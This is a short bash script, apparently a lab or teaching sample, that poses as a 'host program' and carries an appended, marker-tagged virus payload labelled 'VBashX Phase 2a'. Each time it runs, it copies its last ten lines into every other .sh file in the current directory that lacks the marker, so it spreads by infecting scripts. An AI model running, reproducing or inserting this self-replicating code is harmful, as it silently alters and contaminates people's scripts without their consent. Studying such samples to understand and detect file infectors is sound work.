#!/bin/bash
echo "I am the host program"
# --- VBashX Phase 2a --- VBX_7k9Pz
MARKER="VBX_7k9Pz"
VIRUS_SIZE=10
for f in *.sh; do
    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
        if [ -z "$(grep "$MARKER" "$f")" ]; then
            tail -n $VIRUS_SIZE "$0" >> "$f"
        fi
    fi
done
